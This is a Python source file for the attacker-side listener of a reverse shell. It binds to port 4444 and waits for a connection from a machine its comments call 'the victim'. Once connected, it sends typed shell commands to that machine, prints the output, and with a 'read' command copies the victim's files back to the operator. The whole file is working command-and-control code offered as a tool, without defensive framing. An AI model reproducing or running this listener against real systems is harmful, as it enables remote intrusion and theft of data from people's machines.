import socket

SERVER_HOST = "10.0.1.24" # desktop
SERVER_PORT = 4444
BUFFER_SIZE = 1024 # max size of messages

SEPARATOR = "<sep>"

s = socket.socket()

# bind the socket
s.bind((SERVER_HOST, SERVER_PORT))

# Listening
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept client to connect
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Receiving the current working directory from the victim
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory", cwd)

# Loop for making commands and sending them to the victim
while True:
    # Reading 
    command = input(f"{cwd} $> ")
    splitted_command = command.split()
    if not command.strip():
        continue

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    elif splitted_command[0].lower() == "read" :
        file_name = splitted_command[1]
        
        file_size = int(client_socket.recv(BUFFER_SIZE).decode())
        print(file_size)
        data = client_socket.recv(file_size)
        with open(file_name, "wb") as f:
            f.write(data)
        """
        with open(file_name, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                data = client_socket.recv(BUFFER_SIZE)
                if not data:    
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(data)
        """
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)